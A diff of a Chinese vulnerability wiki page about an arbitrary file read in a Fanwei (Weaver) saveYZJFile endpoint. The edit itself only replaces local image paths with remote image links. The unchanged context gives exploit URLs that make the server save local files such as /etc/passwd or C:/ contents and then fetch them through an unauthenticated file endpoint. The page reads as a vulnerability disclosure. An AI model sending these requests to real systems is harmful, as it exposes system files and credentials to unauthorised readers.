@@ -26,25 +26,25 @@
 
 访问 **http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt**
 
-![](image/fanwei-1.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-1.png)
 
 成功返回 **id值**,说明含有此漏洞
 
 调用查看文件接口访问 **http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值**
 
-![](image/fanwei-2.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-2.png)
 
 ### Linux
 
 访问 **http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt**
 
-![](image/fanwei-3.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-3.png)
 
 成功返回 **id值**,说明含有此漏洞
 
 调用查看文件接口访问 **http://xxx.xxx.xxx.xxx/file/fileNoLogin/id值**
 
-![](image/fanwei-4.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-4.png)
 
 ## 漏洞利用POC
 
@@ -184,4 +184,4 @@ if __name__ == '__main__':
 
 ```
 
-![](image/fanwei-5.png)
+![](http://wikioss.peiqi.tech/vuln/fanwei-5.png)
